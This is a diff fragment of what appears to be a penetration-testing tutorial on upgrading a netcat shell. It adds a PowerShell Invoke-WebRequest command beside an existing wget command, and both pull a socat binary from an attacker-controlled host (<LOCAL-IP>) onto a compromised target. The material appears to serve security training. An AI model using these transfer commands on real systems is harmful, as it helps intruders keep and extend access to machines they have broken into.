@@ -109,3 +109,6 @@ A typical way to achieve this would be using a webserver on the attacking machin
  then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget 
 
     wget <LOCAL-IP>/socat -O /tmp/socat
+ For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed 
+ 
+    Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
